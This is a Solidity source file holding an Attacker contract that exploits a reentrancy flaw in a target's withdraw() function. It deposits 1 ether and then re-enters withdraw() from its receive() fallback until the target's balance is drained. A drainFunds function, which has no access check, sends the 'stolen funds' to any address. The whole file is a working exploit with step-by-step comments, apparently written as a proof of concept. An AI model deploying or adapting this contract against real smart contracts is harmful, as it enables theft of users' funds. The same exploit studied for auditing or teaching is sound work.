// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.20;

/**
 * @title IVulnerable
 * @dev This is the interface for the vulnerable contract.
 * It contains a mapping of user balances and two functions:
 * `deposit` to add funds and `withdraw` to remove them.
 * The `withdraw` function is vulnerable to a reentrancy attack.
 */
interface IVulnerable {
    function deposit() external payable;
    function withdraw(uint256 _amount) external;
}

/**
 * @title Attacker
 * @dev This contract exploits a reentrancy vulnerability in a target contract.
 * The attack flow is as follows:
 * 1. The attacker deposits 1 Ether into the vulnerable contract via the `attack()` function.
 * 2. The `attack()` function then calls the `withdraw()` function on the vulnerable contract.
 * 3. The vulnerable contract checks the attacker's balance and proceeds to send 1 Ether.
 * 4. The Ether transfer triggers this contract's `receive()` fallback function.
 * 5. Inside `receive()`, the contract checks if the vulnerable contract still has a balance greater than 1 Ether.
 * 6. If it does, it re-enters the `withdraw()` function, tricking the vulnerable contract into sending another 1 Ether
 *    before it has had a chance to update the attacker's balance from the first withdrawal.
 * 7. This process repeats until the vulnerable contract's balance is drained.
 */
contract Attacker {

    IVulnerable public target;
    uint256 public constant ATTACK_AMOUNT = 1 ether;

    /// @dev Sets the address of the vulnerable contract.
    constructor(address _target) {
        target = IVulnerable(_target);
    }

    /// @dev Fallback function that is triggered when the contract receives Ether.
    /// This is the core of the reentrancy attack.
    receive() external payable {
        // As long as the victim's balance is substantial, re-enter the `withdraw` function.
        if (address(target).balance >= ATTACK_AMOUNT) {
            target.withdraw(ATTACK_AMOUNT);
        }
    }

    /// @dev Initiates the attack.
    function attack() external payable {
        require(msg.value >= ATTACK_AMOUNT, "Must send at least 1 Ether to start attack");

        // Step 1: Deposit funds into the vulnerable contract to establish a balance.
        target.deposit{value: ATTACK_AMOUNT}();

        // Step 2: Begin the withdrawal, which will trigger the reentrancy in the `receive()` function.
        target.withdraw(ATTACK_AMOUNT);
    }

    /// @dev A function to allow the owner to withdraw the stolen funds.
    function drainFunds(address payable _to) external {
        (bool success, ) = _to.call{value: address(this).balance}("");
        require(success, "Failed to send Ether");
    }
}